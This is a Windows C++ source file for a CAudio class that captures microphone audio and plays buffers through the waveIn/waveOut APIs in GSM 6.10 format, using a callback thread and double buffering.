// Audio.cpp: implementation of the CAudio class.
//
//////////////////////////////////////////////////////////////////////
#include "Audio.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudio::CAudio()
{
	m_hEventWaveIn		= CreateEvent(NULL, false, false, NULL);
	m_hStartRecord		= CreateEvent(NULL, false, false, NULL);
	m_hThreadCallBack	= NULL;
	m_nWaveInIndex		= 0;
	m_nWaveOutIndex		= 0;
	m_nBufferLength		= 1000; // m_GSMWavefmt.wfx.nSamplesPerSec / 8(bit)

	m_bIsWaveInUsed		= false;
	m_bIsWaveOutUsed	= false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioData[i] = new BYTE[m_nBufferLength];
		m_lpInAudioHdr[i] = new WAVEHDR;

		m_lpOutAudioData[i] = new BYTE[m_nBufferLength];
		m_lpOutAudioHdr[i] = new WAVEHDR;
	}
	
	memset(&m_GSMWavefmt, 0, sizeof(GSM610WAVEFORMAT));

	m_GSMWavefmt.wfx.wFormatTag = WAVE_FORMAT_GSM610; // ACM will auto convert wave format
	m_GSMWavefmt.wfx.nChannels = 1;
	m_GSMWavefmt.wfx.nSamplesPerSec = 8000;
	m_GSMWavefmt.wfx.nAvgBytesPerSec = 1625;
	m_GSMWavefmt.wfx.nBlockAlign = 65;
	m_GSMWavefmt.wfx.wBitsPerSample = 0;
	m_GSMWavefmt.wfx.cbSize = 2;
	m_GSMWavefmt.wSamplesPerBlock = 320;
}

CAudio::~CAudio()
{
	if (m_bIsWaveInUsed)
	{
		waveInStop(m_hWaveIn);
		waveInReset(m_hWaveIn);
		for (int i = 0; i < 2; i++)
			waveInUnprepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		waveInClose(m_hWaveIn);
		TerminateThread(m_hThreadCallBack, -1);
	}

	if (m_bIsWaveOutUsed)
	{
		waveOutReset(m_hWaveOut);
		for (int i = 0; i < 2; i++)
			waveOutUnprepareHeader(m_hWaveOut, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		waveOutClose(m_hWaveOut);
	}		


	for (int i = 0; i < 2; i++)
	{
		delete [] m_lpInAudioData[i];
		delete m_lpInAudioHdr[i];
		
		delete [] m_lpOutAudioData[i];
		delete m_lpOutAudioHdr[i];
	}

	CloseHandle(m_hEventWaveIn);
	CloseHandle(m_hStartRecord);
	CloseHandle(m_hThreadCallBack);
}

LPBYTE CAudio::getRecordBuffer(LPDWORD lpdwBytes)
{
	// Not open WaveIn yet, so open it...
	if (!m_bIsWaveInUsed && !InitializeWaveIn())
		return NULL;

	if (lpdwBytes == NULL)
		return NULL;

	SetEvent(m_hStartRecord);
	WaitForSingleObject(m_hEventWaveIn, INFINITE);
	*lpdwBytes = m_nBufferLength;
	return	m_lpInAudioData[m_nWaveInIndex];
}

bool CAudio::playBuffer(LPBYTE lpWaveBuffer, DWORD dwBytes)
{
	if (!m_bIsWaveOutUsed && !InitializeWaveOut())
		return NULL;

	for (int i = 0; i < dwBytes; i += m_nBufferLength)
	{
		memcpy(m_lpOutAudioData[m_nWaveOutIndex], lpWaveBuffer, m_nBufferLength);
		waveOutWrite(m_hWaveOut, m_lpOutAudioHdr[m_nWaveOutIndex], sizeof(WAVEHDR));
		m_nWaveOutIndex = 1 - m_nWaveOutIndex;
	}
	return true;
}

bool CAudio::InitializeWaveIn()
{
	if (!waveInGetNumDevs())
		return false;

	MMRESULT	mmResult;
	DWORD		dwThreadID = 0;
	m_hThreadCallBack = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)waveInCallBack, (LPVOID)this, CREATE_SUSPENDED, &dwThreadID);
	mmResult = waveInOpen(&m_hWaveIn, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)dwThreadID, (LONG)0, CALLBACK_THREAD);

	if (mmResult != MMSYSERR_NOERROR)
		return false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioHdr[i]->lpData = (LPSTR)m_lpInAudioData[i];
		m_lpInAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpInAudioHdr[i]->dwFlags = 0;
		m_lpInAudioHdr[i]->dwLoops = 0;
		waveInPrepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
	}
	
	waveInAddBuffer(m_hWaveIn, m_lpInAudioHdr[m_nWaveInIndex], sizeof(WAVEHDR));

	ResumeThread(m_hThreadCallBack);
	waveInStart(m_hWaveIn);

	m_bIsWaveInUsed = true;

	return true;

}

bool CAudio::InitializeWaveOut()
{

	if (!waveOutGetNumDevs())
		return false;
	int i = 0;
	for (i = 0; i < 2; i++)
		memset(m_lpOutAudioData[i], 0, m_nBufferLength);
	
	MMRESULT	mmResult;
	mmResult = waveOutOpen(&m_hWaveOut, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)0, (LONG)0, CALLBACK_NULL);
	if (mmResult != MMSYSERR_NOERROR)
		return false;

	for (i = 0; i < 2; i++)
	{
		m_lpOutAudioHdr[i]->lpData = (LPSTR)m_lpOutAudioData[i];
		m_lpOutAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpOutAudioHdr[i]->dwFlags = 0;
		m_lpOutAudioHdr[i]->dwLoops = 0;
		waveOutPrepareHeader(m_hWaveOut, m_lpOutAudioHdr[i], sizeof(WAVEHDR));
	}
	
	m_bIsWaveOutUsed = true;
	return true;
}

DWORD WINAPI CAudio::waveInCallBack( LPVOID lparam )
{
	CAudio	*pThis = (CAudio *)lparam;

	MSG	Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		if (Msg.message == MM_WIM_DATA)
		{
			// 通知的数据到来
			SetEvent(pThis->m_hEventWaveIn);
			// 等待开始下次录音
			WaitForSingleObject(pThis->m_hStartRecord, INFINITE);

			pThis->m_nWaveInIndex = 1 - pThis->m_nWaveInIndex;
			
			MMRESULT mmResult = waveInAddBuffer(pThis->m_hWaveIn, pThis->m_lpInAudioHdr[pThis->m_nWaveInIndex], sizeof(WAVEHDR));
			if (mmResult != MMSYSERR_NOERROR)
				return -1;
			
		}

		// Why never happend this
		if (Msg.message == MM_WIM_CLOSE)
			break;

		TranslateMessage(&Msg); 
		DispatchMessage(&Msg);
	}

	return 0;	
}